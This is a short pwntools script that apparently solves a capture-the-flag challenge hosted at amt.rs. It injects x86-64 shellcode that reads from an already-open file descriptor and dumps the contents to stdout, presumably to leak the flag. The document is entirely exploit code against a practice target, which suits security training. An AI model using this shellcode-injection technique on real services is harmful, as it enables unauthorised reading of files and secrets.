#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chal")

local = False 
if local:
    p = process("./chal")
    gdb.attach(p,'''b*main+463\nc\nb*$rdx\nc''')
else:
    p = remote('amt.rs', 31174)

elf = context.binary = ELF('./chal', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


shellcode = asm('''
        mov eax, 0  
        mov rsi, rdi             
        mov edi, 3           
        syscall   
		''')
shellcode += asm('''
        mov eax, 1            
        mov edi, 1            
        mov edx, 5555        
        syscall   
		''')
sla(b'>', shellcode)
p.interactive()